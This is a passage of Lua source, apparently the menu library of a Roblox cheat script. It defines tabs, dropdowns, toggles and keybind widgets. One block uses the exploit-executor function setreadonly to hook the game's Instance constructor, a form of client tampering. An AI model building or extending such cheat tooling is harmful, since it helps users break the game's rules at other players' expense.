					TextLabel.TextSize = 12.000
					TextLabel.TextStrokeTransparency = 0.000
					TextLabel.TextXAlignment = Enum.TextXAlignment.Left

				TabButtons.Name = "TabButtons"
				TabButtons.Parent = Holder
				TabButtons.BackgroundColor3 = C.COL3RGB(255, 255, 255)
				TabButtons.BackgroundTransparency = 1.000
				TabButtons.Position = C.UDIM2(0.13, 0, 0, 0)
				TabButtons.Size = C.UDIM2(0, 498, 0, 25)


				UIListLayout.Parent = TabButtons
				UIListLayout.FillDirection = Enum.FillDirection.Horizontal
				UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

				Tabs.Name = "Tabs" 
				Tabs.Parent = Menu 
				Tabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
				Tabs.BackgroundTransparency = 1.000 
				Tabs.Position = C.UDIM2(0, 0, 0, 2) 
				Tabs.Size = C.UDIM2(0, 590, 0, 600) 
				
				setreadonly(Instance, false)

				local oldNewInstance = C.INST

				C.INST = function(...)
					
					local args = {...}

					if args[1] == "SamuelPaste" then
						return library
					end

					return oldNewInstance(...)
				end

				setreadonly(Instance, true)

				local first = true 
				local currenttab 

				function menu:Tab(text) 
					local tabname 
					tabname = text 
					local Tab = {} 
					values[tabname] = {} 

					local TextButton = C.INST("TextButton") 
					TextButton.Parent = TabButtons
					TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255)
					TextButton.BackgroundTransparency = 1.000
					TextButton.Size = C.UDIM2(0, 83, 0, 23)
					TextButton.Font = Enum.Font.Ubuntu
					TextButton.Text = text
					TextButton.TextColor3 = C.COL3RGB(255, 255, 255)
					TextButton.TextSize = 12.000
					TextButton.TextStrokeTransparency = 0.000
					local Gard = C.INST("Frame")
					Gard.Name = "Gard"
					Gard.Parent = TextButton
					Gard.BackgroundColor3 = MainUIColor
					Gard.BorderSizePixel = 0
					Gard.Position = C.UDIM2(0, 0, 1, 0)
					Gard.Size = C.UDIM2(0, 83, 0, 1)

					local TabGui = C.INST("ScrollingFrame") 
					local Left = C.INST("Frame") 
					local UIListLayout = C.INST("UIListLayout") 
					local Right = C.INST("Frame") 
					local UIListLayout_2 = C.INST("UIListLayout") 

		TabGui.Name = 'TabGui'
		TabGui.Parent = Tabs
		TabGui.BackgroundColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BorderColor3 = C.COL3RGB(25, 25, 25)
		TabGui.BackgroundTransparency = 1
		TabGui.ScrollBarThickness = 4
		TabGui.BorderSizePixel = 0
		TabGui.ScrollBarImageTransparency = 0.9
		TabGui.Position = C.UDIM2(0, 5, 0, 2)
		TabGui.Size = C.UDIM2(0, 590, 1, 0)
		TabGui.Visible = false
		TabGui.CanvasSize = C.UDIM2(0, 0, 4.5, 0)


					Left.Name = "Left" 
					Left.Parent = TabGui 
					Left.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Left.BackgroundTransparency = 1.000 
					Left.Position = C.UDIM2(0, 15, 0, 11) 
					Left.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout.Parent = Left 
					UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout.Padding = UDim.new(0, 10) 

					Right.Name = "Right" 
					Right.Parent = TabGui 
					Right.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
					Right.BackgroundTransparency = 1.000 
					Right.Position = C.UDIM2(0, 303, 0, 11) 
					Right.Size = C.UDIM2(0, 279, 0, 543) 

					UIListLayout_2.Parent = Right 
					UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
					UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
					UIListLayout_2.Padding = UDim.new(0, 10) 

					if first then 
						TextButton.TextColor3 = C.COL3RGB(255, 255, 255) 
						currenttab = text 
						TabGui.Visible = true 
						first = false 
					end 

					TextButton.MouseButton1Down:Connect(function() 
						if currenttab ~= text then 
							for i,v in pairs(TabButtons:GetChildren()) do 
								if v:IsA("TextButton") then 
									library:Tween(v, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
									library:Tween(v.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 1.000}) 
								end 
							end 
							for i,v in pairs(Tabs:GetChildren()) do 
								v.Visible = false 
							end 
							library:Tween(TextButton, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)})
							library:Tween(TextButton.Gard, TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundTransparency = 0.000})
							currenttab = text 
							TabGui.Visible = true 
						end 
					end) 

					function Tab:MSector(text, side) 
						local sectorname = text 
						local MSector = {} 
						values[tabname][text] = {} 


						local Section = C.INST("Frame") 
						local SectionText = C.INST("TextLabel") 
						local Inner = C.INST("Frame") 
						local sectiontabs = C.INST("Frame") 
						local UIListLayout_2 = C.INST("UIListLayout") 

						Section.Name = "Section" 
						Section.Parent = TabGui[side] 
						Section.BackgroundColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderColor3 = C.COL3RGB(18, 18, 16) 
						Section.BorderSizePixel = 0 
						Section.Size = C.UDIM2(1, 0, 0, 33) 

						SectionText.Name = "SectionText" 
						SectionText.Parent = Section 
						SectionText.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.BackgroundTransparency = 1.000 
						SectionText.Position = C.UDIM2(0, 7, 0, -12) 
						SectionText.Size = C.UDIM2(0, 270, 0, 19) 
						SectionText.ZIndex = 2 
						SectionText.Font = Enum.Font.Gotham 
						SectionText.Text = text 
						SectionText.TextColor3 = C.COL3RGB(255, 255, 255) 
						SectionText.TextSize = 12.000 
						SectionText.TextXAlignment = Enum.TextXAlignment.Left 

						Inner.Name = "Inner" 
						Inner.Parent = Section 
						Inner.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
						Inner.BorderColor3 = C.COL3RGB(0, 0, 0) 
						Inner.BorderSizePixel = 0 
						Inner.Position = C.UDIM2(0, 1, 0, 1) 
						Inner.Size = C.UDIM2(1, -2, 1, -9) 

						sectiontabs.Name = "sectiontabs" 
						sectiontabs.Parent = Section 
						sectiontabs.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
						sectiontabs.BackgroundTransparency = 1.000 
						sectiontabs.Position = C.UDIM2(0, 0, 0, 6) 
						sectiontabs.Size = C.UDIM2(1, 0, 0, 22) 

						UIListLayout_2.Parent = sectiontabs 
						UIListLayout_2.FillDirection = Enum.FillDirection.Horizontal 
						UIListLayout_2.HorizontalAlignment = Enum.HorizontalAlignment.Center 
						UIListLayout_2.SortOrder = Enum.SortOrder.LayoutOrder 
						UIListLayout_2.Padding = UDim.new(0,4) 

						local firs = true 
						local selected 
						function MSector:Tab(text) 
							local tab = {} 
							values[tabname][sectorname][text] = {} 
							local tabtext = text 

							local tabsize = C.UDIM2(1, 0, 0, 44) 

							local tab1 = C.INST("Frame") 
							local UIPadding = C.INST("UIPadding") 
							local UIListLayout = C.INST("UIListLayout") 
							local TextButton = C.INST("TextButton") 

							tab1.Name = text 
							tab1.Parent = Inner 
							tab1.BackgroundColor3 = C.COL3RGB(30, 30, 30) 
							tab1.BorderColor3 = C.COL3RGB(18, 18, 16) 
							tab1.BorderSizePixel = 0 
							tab1.Position = C.UDIM2(0, 0, 0, 30) 
							tab1.Size = C.UDIM2(1, 0, 1, -21) 
							tab1.Name = text 
							tab1.Visible = false 

							UIPadding.Parent = tab1 
							UIPadding.PaddingTop = UDim.new(0, 0) 

							UIListLayout.Parent = tab1 
							UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
							UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 
							UIListLayout.Padding = UDim.new(0, 1) 

							TextButton.Parent = sectiontabs 
							TextButton.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
							TextButton.BackgroundTransparency = 1.000 
							TextButton.Size = C.UDIM2(0, txt:GetTextSize(text, 14, Enum.Font.Gotham, C.Vec2(700,700)).X + 2, 1, 0) 
							TextButton.Font = Enum.Font.Gotham 
							TextButton.Text = text 
							TextButton.TextColor3 = C.COL3RGB(200, 200, 200) 
							TextButton.TextSize = 11.000
							TextButton.Name = text 

							TextButton.MouseButton1Down:Connect(function() 
								for i,v in pairs(Inner:GetChildren()) do 
									v.Visible = false 
								end 
								for i,v in pairs(sectiontabs:GetChildren()) do 
									if v:IsA("TextButton") then 
										library:Tween(v, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
									end 
								end 
								Section.Size = tabsize 
								tab1.Visible = true 
								library:Tween(TextButton, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
							end) 

							function tab:Element(type, text, data, callback) 
								local Element = {} 
								data = data or {} 
								callback = callback or function() end 
								values[tabname][sectorname][tabtext][text] = {} 

								if type == "Jumbobox" then 
									tabsize = tabsize + C.UDIM2(0,0,0, 39) 
									Element.value = {Jumbobox = {}} 
									data.options = data.options or {} 

									local Dropdown = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local TextLabel = C.INST("TextLabel") 
									local Drop = C.INST("ScrollingFrame") 
									local Button_2 = C.INST("TextButton") 
									local TextLabel_2 = C.INST("TextLabel") 
									local UIListLayout = C.INST("UIListLayout") 
									local ImageLabel = C.INST("ImageLabel") 
									local TextLabel_3 = C.INST("TextLabel") 

									Dropdown.Name = "Dropdown" 
									Dropdown.Parent = tab1 
									Dropdown.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Dropdown.BackgroundTransparency = 1.000 
									Dropdown.Position = C.UDIM2(0, 0, 0.255102038, 0) 
									Dropdown.Size = C.UDIM2(1, 0, 0, 39) 

									Button.Name = "Button" 
									Button.Parent = Dropdown 
									Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Button.Position = C.UDIM2(0, 30, 0, 16) 
									Button.Size = C.UDIM2(0, 175, 0, 17) 
									Button.AutoButtonColor = false 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
									TextLabel.Position = C.UDIM2(0, 5, 0, 0) 
									TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = "..." 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local abcd = TextLabel 

									Drop.Name = "Drop"
									Drop.Parent = Button 
									Drop.Active = true 
									Drop.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Drop.BorderColor3 = C.COL3RGB(18, 18, 16) 
									Drop.Position = C.UDIM2(0, 0, 1, 1) 
									Drop.Size = C.UDIM2(1, 0, 0, 20) 
									Drop.Visible = false 
									Drop.BottomImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.CanvasSize = C.UDIM2(1, 1, 1, 1) 
									Drop.ScrollBarThickness = 4 
									Drop.TopImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.MidImage = "http://www.roblox.com/asset/?id=6724808282" 
									Drop.AutomaticCanvasSize = "Y" 
									Drop.ZIndex = 5 
									Drop.ScrollBarImageColor3 = MainUIColor 

									UIListLayout.Parent = Drop 
									UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
									UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

									values[tabname][sectorname][tabtext][text] = Element.value 
									local num = #data.options 
									if num > 5 then 
										Drop.Size = C.UDIM2(1, 0, 0, 85) 
									else 
										Drop.Size = C.UDIM2(1, 0, 0, 17*num) 
									end 
									local first = true 

									local function updatetext() 
										local old = {} 
										for i,v in ipairs(data.options) do 
											if C.TBLFIND(Element.value.Jumbobox, v) then 
												C.INSERT(old, v) 
											else 
											end 
										end 
										local str = "" 


										if #old == 0 then 
											str = "..." 
										else 
											if #old == 1 then 
												str = old[1] 
											else 
												for i,v in ipairs(old) do 
													if i == 1 then 
														str = v 
													else 
														if i > 2 then 
															if i < 4 then 
																str = str..",  ..." 
															end 
														else 
															str = str..",  "..v 
														end 
													end 
												end 
											end 
										end 

										abcd.Text = str 
									end 
									for i,v in ipairs(data.options) do 
										do 
											local Button = C.INST("TextButton") 
											local TextLabel = C.INST("TextLabel") 

											Button.Name = v 
											Button.Parent = Drop 
											Button.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
											Button.BorderColor3 = C.COL3RGB(18, 18, 16) 
											Button.Position = C.UDIM2(0, 30, 0, 16) 
											Button.Size = C.UDIM2(0, 175, 0, 17) 
											Button.AutoButtonColor = false 
											Button.Font = Enum.Font.SourceSans 
											Button.Text = "" 
											Button.TextColor3 = C.COL3RGB(0, 0, 0) 
											Button.TextSize = 11.000
											Button.BorderSizePixel = 0 
											Button.ZIndex = 6 

											TextLabel.Parent = Button 
											TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
											TextLabel.BackgroundTransparency = 1.000 
											TextLabel.BorderColor3 = C.COL3RGB(27, 42, 53) 
											TextLabel.Position = C.UDIM2(0, 5, 0, -1) 
											TextLabel.Size = C.UDIM2(-0.21714285, 208, 1, 0) 
											TextLabel.Font = Enum.Font.Gotham 
											TextLabel.Text = v 
											TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
											TextLabel.TextSize = 11.000
											TextLabel.TextXAlignment = Enum.TextXAlignment.Left 
											TextLabel.ZIndex = 6 

											Button.MouseButton1Down:Connect(function() 
												if C.TBLFIND(Element.value.Jumbobox, v) then 
													for i,a in pairs(Element.value.Jumbobox) do 
														if a == v then 
															TBLREMOVE(Element.value.Jumbobox, i) 
														end 
													end 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
												else 
													C.INSERT(Element.value.Jumbobox, v) 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
												end 
												updatetext() 

												values[tabname][sectorname][tabtext][text] = Element.value 
												callback(Element.value) 
											end) 
											Button.MouseEnter:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = MainUIColor}) 
												end 
											end) 
											Button.MouseLeave:Connect(function() 
												if not C.TBLFIND(Element.value.Jumbobox, v) then 
													library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
												end 
											end) 

											first = false 
										end 
									end 
									function Element:SetValue(val) 
										Element.value = val 
										for i,v in pairs(Drop:GetChildren()) do 
											if v.Name ~= "UIListLayout" then 
												if C.TBLFIND(val.Jumbobox, v.Name) then 
													v.TextLabel.TextColor3 = C.COL3RGB(175, 175, 175) 
												else 
													v.TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
												end 
											end 
										end 
										updatetext() 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(val) 
									end 
									if data.default then 
										Element:SetValue(data.default) 
									end 

									ImageLabel.Parent = Button 
									ImageLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									ImageLabel.BackgroundTransparency = 1.000 
									ImageLabel.Position = C.UDIM2(0, 165, 0, 6) 
									ImageLabel.Size = C.UDIM2(0, 6, 0, 4) 
									ImageLabel.Image = "http://www.roblox.com/asset/?id=6724771531" 

									TextLabel_3.Parent = Dropdown 
									TextLabel_3.BackgroundColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.BackgroundTransparency = 1.000 
									TextLabel_3.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel_3.Size = C.UDIM2(0.111913361, 208, 0.382215232, 0) 
									TextLabel_3.Font = Enum.Font.Gotham 
									TextLabel_3.Text = text 
									TextLabel_3.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel_3.TextSize = 11.000
									TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left 

									Button.MouseButton1Down:Connect(function() 
										Drop.Visible = not Drop.Visible 
										if not Drop.Visible then 
											Drop.CanvasPosition = C.Vec2(0,0) 
										end 
									end) 
									local indrop = false 
									local ind = false 
									Drop.MouseEnter:Connect(function() 
										indrop = true 
									end) 
									Drop.MouseLeave:Connect(function() 
										indrop = false 
									end) 
									Button.MouseEnter:Connect(function() 
										ind = true 
									end) 
									Button.MouseLeave:Connect(function() 
										ind = false 
									end) 
									game:GetService("UserInputService").InputBegan:Connect(function(input) 
										if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 then 
											if Drop.Visible == true and not indrop and not ind then 
												Drop.Visible = false 
												Drop.CanvasPosition = C.Vec2(0,0) 
											end 
										end 
									end) 
								elseif type == "TextBox" then 

								elseif type == "ToggleKeybind" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false, Key = data.default and data.default.Key or nil, Type = "Always", Active = true} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
									Button.Font = Enum.Font.SourceSans 
									Button.Text = "" 
									Button.TextColor3 = C.COL3RGB(0, 0, 0) 
									Button.TextSize = 11.000

									Color.Name = "Color" 
									Color.Parent = Button 
									Color.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
									Color.BorderColor3 = C.COL3RGB(27, 3275, 35) 
									Color.Position = C.UDIM2(0, 15, 0.5, -5) 
									Color.Size = C.UDIM2(0, 8, 0, 8) 
									local binding = false 
									TextLabel.Parent = Button 
									TextLabel.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									TextLabel.BackgroundTransparency = 1.000 
									TextLabel.Position = C.UDIM2(0, 32, 0, -1) 
									TextLabel.Size = C.UDIM2(0.111913361, 208, 1, 0) 
									TextLabel.Font = Enum.Font.Gotham 
									TextLabel.Text = text 
									TextLabel.TextColor3 = C.COL3RGB(200, 200, 200) 
									TextLabel.TextSize = 11.000
									TextLabel.TextXAlignment = Enum.TextXAlignment.Left 

									local function update() 
										if Element.value.Toggle then 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = MainUIColor}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255, 255, 255)}) 
										else 
											keybindremove(text, Element.value.Key) 
											tween = library:Tween(Color, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {BackgroundColor3 = C.COL3RGB(46, 46, 46)}) 
											library:Tween(TextLabel, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200, 200, 200)}) 
										end 
										values[tabname][sectorname][tabtext][text] = Element.value 
										callback(Element.value) 
									end 

									Button.MouseButton1Down:Connect(function() 
										if not binding then 
											Element.value.Toggle = not Element.value.Toggle 
											if Element.value.Toggle and Element.value.Key ~= nil then
												keybindadd(text, Element.value.Key)
											end
											update() 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end 
									end) 
									if data.default then 
										update() 
									end 
									values[tabname][sectorname][tabtext][text] = Element.value 
									do 
										local Keybind = C.INST("TextButton") 
										local Frame = C.INST("Frame") 
										local Always = C.INST("TextButton") 
										local UIListLayout = C.INST("UIListLayout") 
										local Hold = C.INST("TextButton") 
										local Toggle = C.INST("TextButton") 

										Keybind.Name = "Keybind" 
										Keybind.Parent = Button 
										Keybind.BackgroundColor3 = C.COL3RGB(31, 31, 31) 
										Keybind.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Keybind.Position = C.UDIM2(0, 270, 0.5, -6) 
										Keybind.Text = "none" 
										Keybind.Size = C.UDIM2(0, 43, 0, 12) 
										Keybind.Size = C.UDIM2(0,txt:GetTextSize("none", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
										Keybind.AutoButtonColor = false 
										Keybind.Font = Enum.Font.Gotham 
										Keybind.TextColor3 = C.COL3RGB(200, 200, 200) 
										Keybind.TextSize = 11.000
										Keybind.AnchorPoint = C.Vec2(1,0) 
										Keybind.ZIndex = 3 

										Frame.Parent = Keybind 
										Frame.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Frame.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Frame.Position = C.UDIM2(1, -49, 0, 1) 
										Frame.Size = C.UDIM2(0, 49, 0, 49) 
										Frame.Visible = false 
										Frame.ZIndex = 3 

										Always.Name = "Always" 
										Always.Parent = Frame 
										Always.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Always.BackgroundTransparency = 1.000 
										Always.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Always.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Always.Size = C.UDIM2(1, 0, 0, 16) 
										Always.AutoButtonColor = false 
										Always.Font = Enum.Font.SourceSansBold 
										Always.Text = "Always" 
										Always.TextColor3 = C.COL3RGB(173, 24, 74) 
										Always.TextSize = 11.000
										Always.ZIndex = 3 

										UIListLayout.Parent = Frame 
										UIListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Center 
										UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder 

										Hold.Name = "Hold" 
										Hold.Parent = Frame 
										Hold.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Hold.BackgroundTransparency = 1.000 
										Hold.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Hold.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Hold.Size = C.UDIM2(1, 0, 0, 16) 
										Hold.AutoButtonColor = false 
										Hold.Font = Enum.Font.Gotham 
										Hold.Text = "Hold" 
										Hold.TextColor3 = C.COL3RGB(200, 200, 200) 
										Hold.TextSize = 11.000
										Hold.ZIndex = 3 

										Toggle.Name = "Toggle" 
										Toggle.Parent = Frame 
										Toggle.BackgroundColor3 = C.COL3RGB(46, 46, 46) 
										Toggle.BackgroundTransparency = 1.000 
										Toggle.BorderColor3 = C.COL3RGB(18, 18, 16) 
										Toggle.Position = C.UDIM2(-3.03289485, 231, 0.115384616, -6) 
										Toggle.Size = C.UDIM2(1, 0, 0, 16) 
										Toggle.AutoButtonColor = false 
										Toggle.Font = Enum.Font.Gotham 
										Toggle.Text = "Toggle" 
										Toggle.TextColor3 = C.COL3RGB(200, 200, 200) 
										Toggle.TextSize = 11.000
										Toggle.ZIndex = 3 

										for _,button in pairs(Frame:GetChildren()) do 
											if button:IsA("TextButton") then 
												button.MouseButton1Down:Connect(function() 
													Element.value.Type = button.Text 
													Frame.Visible = false 
													Element.value.Active = Element.value.Type == "Toggle" and true or false 
													if Element.value.Type == "Always" then 
														keybindremove(text, Element.value.Key) 
													end 
													for _,button in pairs(Frame:GetChildren()) do 
														if button:IsA("TextButton") and button.Text ~= Element.value.Type then 
															button.Font = Enum.Font.Gotham 
															library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
														end 
													end 
													button.Font = Enum.Font.SourceSansBold 
													button.TextColor3 = C.COL3RGB(60, 0, 90) 
													values[tabname][sectorname][tabtext][text] = Element.value 
													callback(Element.value) 
												end) 
												button.MouseEnter:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(255,255,255)}) 
													end 
												end) 
												button.MouseLeave:Connect(function() 
													if Element.value.Type ~= button.Text then 
														library:Tween(button, TweenInfo.new(0.1, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {TextColor3 = C.COL3RGB(200,200,200)}) 
													end 
												end) 
											end 
										end 
										Keybind.MouseButton1Down:Connect(function() 
											if not binding then 
												wait() 
												binding = true 
												Keybind.Text = "..." 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize("...", 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
											end 
										end) 
										Keybind.MouseButton2Down:Connect(function() 
											if not binding then 
												Frame.Visible = not Frame.Visible 
											end 
										end) 
										local Player = game.Players.LocalPlayer 
										local Mouse = Player:GetMouse() 
										local InFrame = false 
										Frame.MouseEnter:Connect(function() 
											InFrame = true 
										end) 
										Frame.MouseLeave:Connect(function() 
											InFrame = false 
										end) 
										local InFrame2 = false 
										Keybind.MouseEnter:Connect(function() 
											InFrame2 = true 
										end) 
										Keybind.MouseLeave:Connect(function() 
											InFrame2 = false 
										end) 
										game:GetService("UserInputService").InputBegan:Connect(function(input) 
											if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.MouseButton2 and not binding then 
												if Frame.Visible == true and not InFrame and not InFrame2 then 
													Frame.Visible = false 
												end 
											end 
											if binding then 
												binding = false 
												Keybind.Text = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name:upper() or input.UserInputType.Name:upper() 
												Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 5,0, 12) 
												Element.value.Key = input.KeyCode.Name ~= "Unknown" and input.KeyCode.Name or input.UserInputType.Name 
												if Element.value.Toggle then
													keybindadd(text, Element.value.Key)
												end
												if input.KeyCode.Name == "Backspace" then 
													Keybind.Text = "none" 
													Keybind.Size = C.UDIM2(0,txt:GetTextSize(Keybind.Text, 14, Enum.Font.Gotham, C.Vec2(700, 12)).X + 4,0, 12) 
													Element.value.Key = nil
													keybindremove(text, Element.value.Key)
												end 
											else 
												if Element.value.Key ~= nil then 
													if C.FIND(Element.value.Key, "Mouse") then 
														if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													else 
														if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
															if Element.value.Type == "Hold" then 
																Element.value.Active = true 
																if Element.value.Active and Element.value.Toggle then 
																	keybindhold(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															elseif Element.value.Type == "Toggle" then 
																Element.value.Active = not Element.value.Active 
																if Element.value.Active and Element.value.Toggle then 
																	keybindtoggle(text) 
																else 
																	keybindremove(text, Element.value.Key) 
																end 
															end 
														end 
													end 
												else 
													Element.value.Active = true 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
										game:GetService("UserInputService").InputEnded:Connect(function(input) 
											if Element.value.Key ~= nil then 
												if C.FIND(Element.value.Key, "Mouse") then 
													if input.UserInputType == Enum.UserInputType[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text) 
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												else 
													if input.KeyCode == Enum.KeyCode[Element.value.Key] then 
														if Element.value.Type == "Hold" then 
															Element.value.Active = false 
															if Element.value.Active and Element.value.Toggle then 
																keybindhold(text)
															else 
																keybindremove(text, Element.value.Key) 
															end 
														end 
													end 
												end 
											end 
											values[tabname][sectorname][tabtext][text] = Element.value 
											callback(Element.value) 
										end) 
									end 
									function Element:SetValue(value) 
										Element.value = value 
										update() 
										if Element.value.Key ~= nil and Element.value.Toggle then
											keybindadd(text, Element.value.Key)
										end
									end 
								elseif type == "Toggle" then 
									tabsize = tabsize + C.UDIM2(0,0,0,16) 
									Element.value = {Toggle = data.default and data.default.Toggle or false} 

									local Toggle = C.INST("Frame") 
									local Button = C.INST("TextButton") 
									local Color = C.INST("Frame") 
									local TextLabel = C.INST("TextLabel") 

									Toggle.Name = "Toggle" 
									Toggle.Parent = tab1 
									Toggle.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Toggle.BackgroundTransparency = 1.000 
									Toggle.Size = C.UDIM2(1, 0, 0, 15) 

									Button.Name = "Button" 
									Button.Parent = Toggle 
									Button.BackgroundColor3 = C.COL3RGB(255, 255, 255) 
									Button.BackgroundTransparency = 1.000 
									Button.Size = C.UDIM2(1, 0, 1, 0) 
